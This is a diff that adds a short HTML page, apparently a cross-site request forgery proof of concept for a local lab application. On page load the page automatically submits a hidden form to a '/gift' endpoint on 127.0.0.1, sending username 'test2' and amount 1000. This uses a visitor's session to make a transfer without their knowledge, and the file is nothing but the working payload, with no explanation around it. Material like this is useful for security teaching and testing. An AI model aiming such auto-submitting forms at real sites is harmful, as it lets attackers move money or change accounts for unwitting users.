@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<body onload="document.getElementById('xsrf-form').submit();">
+    <form id="xsrf-form" action="http://127.0.0.1:8000/gift" method="GET">
+        <input type="hidden" name="username" value="test2" />
+        <input type="hidden" name="amount" value="1000" />
+    </form>
+</body>
+</html>
